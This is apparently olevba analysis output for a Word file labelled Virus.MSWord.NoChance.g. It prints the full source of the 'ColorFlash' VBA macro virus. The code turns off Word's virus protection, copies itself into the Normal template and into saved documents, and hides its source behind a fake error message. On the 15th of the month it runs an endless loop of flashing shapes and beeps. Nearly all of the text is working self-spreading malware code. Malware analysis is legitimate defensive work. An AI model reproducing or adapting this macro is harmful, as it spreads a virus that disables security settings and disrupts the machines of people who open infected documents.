olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NoChance.g-a4998e75e310da72e66301123dd129b2f7a8de07
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NoChance.g-a4998e75e310da72e66301123dd129b2f7a8de07 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ColorFlash.bas 
in file: Virus.MSWord.NoChance.g-a4998e75e310da72e66301123dd129b2f7a8de07 - OLE stream: 'Macros/VBA/ColorFlash'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 2)
T$ = Mid(MyTime, 1, 2)
If D$ = "15" Then
    MsgBox "Il faut mettre un peu de couleur dans votre vie..", vbInformation, "ColorFlash Virus"
    Call PayLoad
End If
If T$ = "15" Then
    MsgBox "Le virus ColorFlash vous souhaite un Bonne Après Midi...", vbInformation, "ZeMacroKiller98"
End If
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "ColorFlash" Then
        ColorFlashInstalled = -1
    End If
Next i
If Not ColorFlashInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ColorFlash", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ColorFlash", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    BMFT.Show
ErrorFT:
End Sub
Private Sub PayLoad()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPL
ActiveDocument.Shapes.AddTextEffect(msoTextEffect11, "ColorFlash", _
        "Impact", 96#, msoFalse, msoFalse, 87.5, 91.3).Select
Selection.ShapeRange.IncrementLeft -8.3
Selection.ShapeRange.IncrementTop 90.3
Charge:
    ActiveDocument.Shapes.AddShape(msoShapeOval, 0#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 20#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 40#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 60#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 80#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 100#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 120#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 140#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 160#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 180#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 200#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 220#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 240#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
        ActiveDocument.Shapes.AddShape(msoShapeOval, 260#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 280#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 300#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 320#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 340#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 360#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 380#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 400#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 420#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 440#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 460#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 480#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 500#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
GoTo Charge
ErrorPL:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    BMTM.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
